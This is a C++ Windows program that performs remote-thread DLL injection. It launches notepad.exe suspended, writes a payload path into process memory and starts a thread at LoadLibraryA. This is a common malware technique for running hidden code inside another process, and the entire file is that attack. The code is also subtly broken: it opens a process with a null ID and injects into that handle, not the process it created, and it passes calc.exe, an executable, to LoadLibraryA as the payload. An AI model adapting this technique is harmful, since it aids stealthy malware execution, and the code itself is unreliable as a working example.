#include <iostream>
#include <Windows.h>

int main()
{
    const char* target_process_name = "notepad.exe";
    const char* payload_file_name = "calc.exe";
    const char* cmd_line_args = "";

    // 1. Open the target process for writing
    HANDLE target_process_handle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, NULL);
    if (!target_process_handle)
    {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    // 2. Get the full path to the payload file
    char payload_full_path[MAX_PATH];
    GetFullPathName(payload_file_name, MAX_PATH, payload_full_path, NULL);

    // 3. Create a suspended process to act as a host for the payload
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;

    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    ZeroMemory(&process_info, sizeof(process_info));

    if (!CreateProcessA(target_process_name, (LPSTR)cmd_line_args, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_info, &process_info))
    {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        return 1;
    }

    // 4. Allocate memory in the target process for the payload
    LPVOID remote_payload_addr = VirtualAllocEx(target_process_handle, NULL, strlen(payload_full_path) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!remote_payload_addr)
    {
        std::cerr << "Failed to allocate memory in target process: " << GetLastError() << std::endl;
        return 1;
    }

    // 5. Write the payload file name to the target process memory
    if (!WriteProcessMemory(target_process_handle, remote_payload_addr, payload_full_path, strlen(payload_full_path) + 1, NULL))
    {
        std::cerr << "Failed to write to target process memory: " << GetLastError() << std::endl;
        return 1;
    }

    // 6. Get the address of LoadLibraryA in the kernel32.dll module
    LPVOID kernel32_dll_addr = GetModuleHandleA("kernel32.dll");
    LPVOID load_library_addr = GetProcAddress((HMODULE)kernel32_dll_addr, "LoadLibraryA");

    // 7. Create a remote thread in the target process to execute the payload
    HANDLE remote_thread_handle = CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_addr, remote_payload_addr, 0, NULL);
    if (!remote_thread_handle)
    {
        std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
        return 1;
    }

    // 8. Resume the target process
    ResumeThread(process_info.hThread);

    // 9. Wait for the remote thread to complete
    WaitForSingleObject(remote_thread_handle, INFINITE);

    // 10. Cleanup
    CloseHandle(remote_thread_handle);
    VirtualFreeEx(target_process_handle, remote_payload_addr, strlen(payload_full_path) + 1, MEM_RELEASE);
    CloseHandle(target_process_handle);
    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);

    return 0;
}
